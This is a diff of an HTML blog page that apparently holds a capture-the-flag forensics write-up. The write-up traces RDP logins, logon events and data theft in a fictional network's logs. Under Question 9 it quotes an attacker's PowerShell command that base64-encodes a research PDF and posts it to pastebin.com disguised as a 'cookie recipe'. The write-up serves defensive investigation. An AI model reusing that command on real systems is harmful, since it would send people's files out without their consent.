@@ -56,7 +56,7 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.3.0"></head>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -169,6 +169,7 @@
 <h1 id="Question-8"><a href="#Question-8" class="headerlink" title="Question 8"></a>Question 8</h1><p>First, we look for connections from the workstation that was RDPed to: <code>EventID: 3 AND source: elfu-res-wks2</code>. We can narrow this further by only searching for connections after <code>2019-11-19 06:04:28</code> (when the RDP session started), as well as adding <code>AND UserAccount: alabaster</code>.<br>We see something from <code>explorer.exe</code>, which indicates they’re using something native to windows, rather than another backdoor/C2.<br>We can then search again for <code>EventID: 4624</code> (Logged in), This time narrowing it down with <code>SourceHostName: ELFU-RES-WKS2</code> (Windows capitalises it here for whatever reason). We see a bunch of logins to <code>alabaster</code> from the compromised computer, all with LogonType <code>3</code> (Network).</p>
 <h1 id="Question-9"><a href="#Question-9" class="headerlink" title="Question 9"></a>Question 9</h1><p>Searching for processes created on elfu-res-wks2, We see a powershell process with the following invocation:</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> https://pastebin.com/post.php <span class="literal">-Method</span> POST <span class="literal">-Body</span> <span class="selector-tag">@</span>&#123; <span class="string">&quot;submit_hidden&quot;</span> = <span class="string">&quot;submit_hidden&quot;</span>; <span class="string">&quot;paste_code&quot;</span> = <span class="variable">$</span>([<span class="type">Convert</span>]::ToBase64String([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf&quot;</span>))); <span class="string">&quot;paste_format&quot;</span> = <span class="string">&quot;1&quot;</span>; <span class="string">&quot;paste_expire_date&quot;</span> = <span class="string">&quot;N&quot;</span>; <span class="string">&quot;paste_private&quot;</span> = <span class="string">&quot;0&quot;</span>; <span class="string">&quot;paste_name&quot;</span>=<span class="string">&quot;cookie recipe&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
 <p>This means we’re reading from <code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code>, which is probably the super secret research.</p>
 <h1 id="Question-10"><a href="#Question-10" class="headerlink" title="Question 10"></a>Question 10</h1><p>We can search for messages surrounding the previous and see the Network Connection event, with DestinationIp <code>104.22.3.84</code>.</p>
 
@@ -232,7 +233,7 @@
     Copyright &copy;
     
     
-    2019-2021
+    2019-2022
     tcmal
   </div>
   <div class="footer-right">
